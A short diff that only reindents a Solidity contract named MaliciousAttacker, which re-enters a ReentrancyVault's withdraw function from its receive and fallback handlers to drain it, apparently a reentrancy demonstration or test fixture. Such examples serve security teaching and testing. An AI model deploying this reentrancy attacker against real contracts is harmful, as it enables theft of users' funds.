@@ -9,13 +9,15 @@ contract MaliciousAttacker {
     constructor(address _vault) {
         vault = ReentrancyVault(_vault);
     }
-receive() external payable {
+
+    receive() external payable {
         // This function is called when the vault sends Ether to the attacker
         // It allows the attacker to re-enter the vault's withdraw function
         if (address(vault).balance >= 1 ether) {
             vault.withdraw();
         }
     }
+
     fallback() external payable {
         if (address(vault).balance >= 1 ether) {
             vault.withdraw();
